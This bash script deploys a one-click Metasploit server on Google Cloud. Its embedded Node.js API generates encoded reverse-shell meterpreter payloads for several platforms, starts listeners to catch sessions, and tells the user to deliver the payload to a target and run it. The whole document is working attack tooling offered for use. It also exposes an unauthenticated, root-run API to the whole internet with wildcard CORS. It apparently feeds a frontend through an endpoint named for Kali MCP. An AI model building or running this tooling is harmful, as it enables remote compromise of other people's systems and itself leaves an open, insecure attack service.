#!/bin/bash
# GCP Metasploit Automation - One-Click Payload Generator & Listener
# This script automates the entire Metasploit workflow on GCP

set -e

echo "🚀 GCP Metasploit Automation - Atoms.Ninja"
echo "============================================"

# Configuration
PROJECT_ID=${GCP_PROJECT_ID:-"atoms-ninja"}
ZONE=${GCP_ZONE:-"us-central1-a"}
INSTANCE_NAME="metasploit-server"
MACHINE_TYPE="e2-standard-2"
IMAGE_FAMILY="debian-11"
IMAGE_PROJECT="debian-cloud"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Functions
log_info() { echo -e "${BLUE}[INFO]${NC} $1"; }
log_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
log_warning() { echo -e "${YELLOW}[WARNING]${NC} $1"; }
log_error() { echo -e "${RED}[ERROR]${NC} $1"; }

# Check if gcloud is installed
if ! command -v gcloud &> /dev/null; then
    log_error "gcloud CLI not found. Install: https://cloud.google.com/sdk/docs/install"
    exit 1
fi

# Check authentication
if ! gcloud auth list --filter=status:ACTIVE --format="value(account)" &> /dev/null; then
    log_warning "Not authenticated. Running: gcloud auth login"
    gcloud auth login
fi

# Set project
log_info "Setting GCP project: $PROJECT_ID"
gcloud config set project $PROJECT_ID

# Check if instance exists
if gcloud compute instances describe $INSTANCE_NAME --zone=$ZONE &> /dev/null; then
    log_warning "Instance $INSTANCE_NAME already exists"
    
    # Get instance IP
    EXTERNAL_IP=$(gcloud compute instances describe $INSTANCE_NAME \
        --zone=$ZONE \
        --format='get(networkInterfaces[0].accessConfigs[0].natIP)')
    
    log_info "Instance IP: $EXTERNAL_IP"
    
    read -p "Do you want to recreate it? (y/N) " -n 1 -r
    echo
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        log_info "Deleting existing instance..."
        gcloud compute instances delete $INSTANCE_NAME --zone=$ZONE --quiet
    else
        log_info "Using existing instance"
        echo ""
        echo "🎯 Access your Metasploit server:"
        echo "   SSH: gcloud compute ssh $INSTANCE_NAME --zone=$ZONE"
        echo "   API: http://$EXTERNAL_IP:3001"
        exit 0
    fi
fi

# Create firewall rules
log_info "Creating firewall rules..."
gcloud compute firewall-rules create metasploit-api \
    --allow tcp:3001 \
    --source-ranges 0.0.0.0/0 \
    --description "Metasploit API server" \
    --quiet 2>/dev/null || log_warning "Firewall rule might already exist"

gcloud compute firewall-rules create metasploit-listeners \
    --allow tcp:4444-4454 \
    --source-ranges 0.0.0.0/0 \
    --description "Metasploit listener ports" \
    --quiet 2>/dev/null || log_warning "Firewall rule might already exist"

# Create startup script
cat > /tmp/metasploit-startup.sh << 'STARTUP_SCRIPT'
#!/bin/bash
set -e

# Update system
export DEBIAN_FRONTEND=noninteractive
apt-get update
apt-get upgrade -y

# Install dependencies
apt-get install -y curl git wget build-essential libssl-dev \
    libreadline-dev zlib1g-dev autoconf bison libyaml-dev \
    libncurses5-dev libffi-dev libgdbm-dev postgresql \
    postgresql-contrib nginx certbot python3-certbot-nginx

# Install Node.js 18.x
curl -fsSL https://deb.nodesource.com/setup_18.x | bash -
apt-get install -y nodejs

# Install Metasploit Framework
log_info() { echo "[$(date +'%Y-%m-%d %H:%M:%S')] $1"; }

log_info "Installing Metasploit Framework..."
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall

# Initialize Metasploit database
log_info "Initializing Metasploit database..."
msfdb init

# Create Metasploit API directory
mkdir -p /opt/metasploit-api
cd /opt/metasploit-api

# Install Atoms.Ninja Metasploit API
cat > package.json << 'EOF'
{
  "name": "metasploit-api",
  "version": "1.0.0",
  "dependencies": {
    "express": "^4.18.2",
    "cors": "^2.8.5",
    "express-rate-limit": "^7.1.5",
    "dotenv": "^16.3.1"
  }
}
EOF

npm install

# Create the API server
cat > server.js << 'APISERVER'
const express = require('express');
const cors = require('cors');
const { spawn, exec } = require('child_process');
const rateLimit = require('express-rate-limit');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3001;

app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '50mb' }));

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100
});
app.use(limiter);

// Store active jobs
const jobs = new Map();

// Execute command helper
async function executeTool(command, args, options = {}) {
  return new Promise((resolve, reject) => {
    const timeout = options.timeout || 60000;
    const proc = spawn(command, args);
    
    let stdout = '';
    let stderr = '';
    
    const timer = setTimeout(() => {
      proc.kill();
      reject(new Error('Timeout'));
    }, timeout);
    
    proc.stdout.on('data', data => stdout += data.toString());
    proc.stderr.on('data', data => stderr += data.toString());
    
    proc.on('close', code => {
      clearTimeout(timer);
      resolve({ code, stdout, stderr });
    });
    
    proc.on('error', err => {
      clearTimeout(timer);
      reject(err);
    });
  });
}

// Health check
app.get('/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    service: 'metasploit-api',
    version: '1.0.0',
    timestamp: new Date().toISOString() 
  });
});

// Generate payload - EASY MODE
app.post('/api/payload/generate', async (req, res) => {
  try {
    const { 
      platform = 'windows',
      type = 'meterpreter',
      lhost,
      lport = 4444,
      format,
      encode = false
    } = req.body;
    
    if (!lhost) {
      return res.status(400).json({ error: 'LHOST required' });
    }
    
    // Auto-determine payload and format
    const payloadMap = {
      'windows': 'windows/meterpreter/reverse_tcp',
      'linux': 'linux/x64/meterpreter/reverse_tcp',
      'android': 'android/meterpreter/reverse_tcp',
      'php': 'php/meterpreter/reverse_tcp',
      'python': 'python/meterpreter/reverse_tcp'
    };
    
    const formatMap = {
      'windows': 'exe',
      'linux': 'elf',
      'android': 'apk',
      'php': 'raw',
      'python': 'raw'
    };
    
    const payload = payloadMap[platform] || payloadMap['windows'];
    const outputFormat = format || formatMap[platform] || 'exe';
    
    const timestamp = Date.now();
    const filename = `payload_${platform}_${timestamp}.${outputFormat === 'raw' ? (platform === 'php' ? 'php' : 'py') : outputFormat}`;
    const outputPath = `/tmp/${filename}`;
    
    // Build msfvenom command
    let args = [
      '-p', payload,
      `LHOST=${lhost}`,
      `LPORT=${lport}`,
      '-f', outputFormat,
      '-o', outputPath
    ];
    
    // Add encoding if requested
    if (encode) {
      const encoders = {
        'windows': 'x86/shikata_ga_nai',
        'linux': 'x64/zutto_dekiru',
        'default': 'x86/shikata_ga_nai'
      };
      args.push('-e', encoders[platform] || encoders['default']);
      args.push('-i', '5');
    }
    
    console.log(`Generating payload: msfvenom ${args.join(' ')}`);
    
    const result = await executeTool('msfvenom', args, { timeout: 120000 });
    
    // Get file size
    const stats = fs.statSync(outputPath);
    const fileSize = stats.size;
    
    res.json({
      success: true,
      payload: {
        id: timestamp,
        name: filename,
        path: outputPath,
        size: fileSize,
        platform: platform,
        type: payload,
        format: outputFormat,
        lhost: lhost,
        lport: lport,
        encoded: encode,
        downloadUrl: `/api/payload/download/${filename}`
      },
      output: result.stdout || result.stderr
    });
    
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Download payload
app.get('/api/payload/download/:filename', (req, res) => {
  const filename = req.params.filename;
  const filepath = path.join('/tmp', filename);
  
  if (fs.existsSync(filepath)) {
    res.download(filepath);
  } else {
    res.status(404).json({ error: 'File not found' });
  }
});

// Start listener - EASY MODE
app.post('/api/listener/start', async (req, res) => {
  try {
    const {
      platform = 'windows',
      lhost = '0.0.0.0',
      lport = 4444
    } = req.body;
    
    const payloadMap = {
      'windows': 'windows/meterpreter/reverse_tcp',
      'linux': 'linux/x64/meterpreter/reverse_tcp',
      'android': 'android/meterpreter/reverse_tcp',
      'php': 'php/meterpreter/reverse_tcp'
    };
    
    const payload = payloadMap[platform] || payloadMap['windows'];
    
    const rcFile = `/tmp/listener_${Date.now()}.rc`;
    const rcContent = `use exploit/multi/handler
set PAYLOAD ${payload}
set LHOST ${lhost}
set LPORT ${lport}
set ExitOnSession false
exploit -j -z
`;
    
    fs.writeFileSync(rcFile, rcContent);
    
    // Start msfconsole in background
    const jobId = Date.now();
    const logFile = `/tmp/msf_${jobId}.log`;
    
    const proc = spawn('msfconsole', ['-r', rcFile, '-L', logFile], {
      detached: true,
      stdio: 'ignore'
    });
    
    proc.unref();
    
    jobs.set(jobId, {
      pid: proc.pid,
      platform,
      payload,
      lhost,
      lport,
      logFile,
      started: new Date().toISOString()
    });
    
    res.json({
      success: true,
      jobId: jobId,
      listener: {
        platform,
        payload,
        lhost,
        lport,
        status: 'starting'
      },
      message: 'Listener starting in background. Check status with /api/listener/status/:jobId'
    });
    
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Listener status
app.get('/api/listener/status/:jobId', (req, res) => {
  const jobId = parseInt(req.params.jobId);
  const job = jobs.get(jobId);
  
  if (!job) {
    return res.status(404).json({ error: 'Job not found' });
  }
  
  // Check if process is still running
  try {
    process.kill(job.pid, 0);
    
    // Read log file
    let log = '';
    if (fs.existsSync(job.logFile)) {
      log = fs.readFileSync(job.logFile, 'utf-8').split('\n').slice(-50).join('\n');
    }
    
    res.json({
      jobId: jobId,
      status: 'running',
      listener: {
        platform: job.platform,
        payload: job.payload,
        lhost: job.lhost,
        lport: job.lport,
        started: job.started
      },
      log: log
    });
  } catch (e) {
    res.json({
      jobId: jobId,
      status: 'stopped',
      listener: job
    });
  }
});

// List active listeners
app.get('/api/listener/list', (req, res) => {
  const activeJobs = [];
  
  for (const [jobId, job] of jobs.entries()) {
    try {
      process.kill(job.pid, 0);
      activeJobs.push({
        jobId,
        ...job,
        status: 'running'
      });
    } catch (e) {
      // Process dead
    }
  }
  
  res.json({ listeners: activeJobs });
});

// Quick setup endpoint - One call does everything
app.post('/api/quick-setup', async (req, res) => {
  try {
    const {
      platform = 'windows',
      lhost,
      lport = 4444,
      encode = true
    } = req.body;
    
    if (!lhost) {
      return res.status(400).json({ error: 'LHOST required' });
    }
    
    // Step 1: Generate payload
    log_info('Step 1: Generating payload...');
    const payloadRes = await fetch('http://localhost:3001/api/payload/generate', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ platform, lhost, lport, encode })
    });
    const payloadData = await payloadRes.json();
    
    // Step 2: Start listener
    log_info('Step 2: Starting listener...');
    const listenerRes = await fetch('http://localhost:3001/api/listener/start', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ platform, lhost, lport })
    });
    const listenerData = await listenerRes.json();
    
    res.json({
      success: true,
      payload: payloadData.payload,
      listener: listenerData.listener,
      jobId: listenerData.jobId,
      instructions: {
        download: `curl http://YOUR_SERVER_IP:3001${payloadData.payload.downloadUrl} -o ${payloadData.payload.name}`,
        deliver: 'Transfer the payload to your target system',
        execute: 'Run the payload on the target',
        monitor: `Check listener status: curl http://YOUR_SERVER_IP:3001/api/listener/status/${listenerData.jobId}`
      }
    });
    
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Metasploit API running on port ${PORT}`);
  console.log(`📡 Health: http://0.0.0.0:${PORT}/health`);
});

function log_info(msg) {
  console.log(`[${new Date().toISOString()}] ${msg}`);
}
APISERVER

# Create systemd service
cat > /etc/systemd/system/metasploit-api.service << 'SERVICE'
[Unit]
Description=Metasploit API Server
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/metasploit-api
ExecStart=/usr/bin/node server.js
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
SERVICE

# Start and enable service
systemctl daemon-reload
systemctl enable metasploit-api
systemctl start metasploit-api

log_info "✅ Metasploit API installed and started!"
log_info "📡 API available on port 3001"

# Setup nginx reverse proxy
cat > /etc/nginx/sites-available/metasploit-api << 'NGINX'
server {
    listen 80;
    server_name _;
    
    location / {
        proxy_pass http://localhost:3001;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
    }
}
NGINX

ln -sf /etc/nginx/sites-available/metasploit-api /etc/nginx/sites-enabled/
rm -f /etc/nginx/sites-enabled/default
systemctl restart nginx

log_info "✅ Setup complete!"
STARTUP_SCRIPT

# Create instance
log_info "Creating GCP instance: $INSTANCE_NAME"
gcloud compute instances create $INSTANCE_NAME \
    --zone=$ZONE \
    --machine-type=$MACHINE_TYPE \
    --image-family=$IMAGE_FAMILY \
    --image-project=$IMAGE_PROJECT \
    --boot-disk-size=20GB \
    --boot-disk-type=pd-standard \
    --metadata-from-file startup-script=/tmp/metasploit-startup.sh \
    --tags=metasploit-server \
    --scopes=cloud-platform

# Wait for instance to be ready
log_info "Waiting for instance to be ready..."
sleep 10

# Get instance IP
EXTERNAL_IP=$(gcloud compute instances describe $INSTANCE_NAME \
    --zone=$ZONE \
    --format='get(networkInterfaces[0].accessConfigs[0].natIP)')

log_success "✅ Instance created successfully!"
echo ""
echo "╔════════════════════════════════════════════════════════════╗"
echo "║          🎯 Metasploit Server Ready!                      ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo ""
echo "📡 Server IP: $EXTERNAL_IP"
echo "🔗 API URL: http://$EXTERNAL_IP:3001"
echo "🔗 Web URL: http://$EXTERNAL_IP"
echo ""
echo "⏰ The server is installing Metasploit (this takes ~10 minutes)"
echo "   Monitor progress: gcloud compute ssh $INSTANCE_NAME --zone=$ZONE --command='tail -f /var/log/syslog'"
echo ""
echo "🚀 Quick Start Commands:"
echo "   # SSH into server"
echo "   gcloud compute ssh $INSTANCE_NAME --zone=$ZONE"
echo ""
echo "   # Check API health"
echo "   curl http://$EXTERNAL_IP:3001/health"
echo ""
echo "   # Generate payload + start listener (ONE COMMAND!)"
echo "   curl -X POST http://$EXTERNAL_IP:3001/api/quick-setup \\"
echo "     -H 'Content-Type: application/json' \\"
echo "     -d '{\"platform\":\"windows\",\"lhost\":\"$EXTERNAL_IP\",\"lport\":4444,\"encode\":true}'"
echo ""
echo "💡 Update your frontend config:"
echo "   KALI_MCP_ENDPOINT: 'http://$EXTERNAL_IP:3001'"
echo ""

# Save config
cat > /tmp/metasploit-gcp-config.txt << EOF
GCP_PROJECT_ID=$PROJECT_ID
GCP_ZONE=$ZONE
INSTANCE_NAME=$INSTANCE_NAME
EXTERNAL_IP=$EXTERNAL_IP
API_ENDPOINT=http://$EXTERNAL_IP:3001
CREATED_AT=$(date)
EOF

log_success "Configuration saved to: /tmp/metasploit-gcp-config.txt"
